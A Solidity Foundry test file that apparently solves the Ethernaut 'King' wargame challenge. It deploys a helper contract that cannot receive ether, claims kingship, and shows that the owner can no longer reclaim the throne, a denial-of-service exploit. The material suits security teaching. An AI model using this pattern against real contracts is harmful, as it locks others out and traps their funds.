// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/King.sol";

contract NotTransferrable {
    function callKing(address king) public {
        king.call{value: .2 ether}("");
    }
}

contract KingTest is Test {
    King king;

    function setUp() public {
        vm.prank(msg.sender);
        king = new King{value: .1 ether}();
    }

    function test() public {
        assertEq(king.king(), msg.sender);

        NotTransferrable notTransferrable = new NotTransferrable();

        vm.deal(address(notTransferrable), 1 ether);
        notTransferrable.callKing(address(king));
        assertEq(king.king(), address(notTransferrable));

        // msg.sender is also the owner
        vm.prank(msg.sender);
        address(king).call{value: .2 ether}("");
        assertEq(king.king(), address(notTransferrable));
        assertEq(address(notTransferrable).balance, 0.8 ether);
    }
}
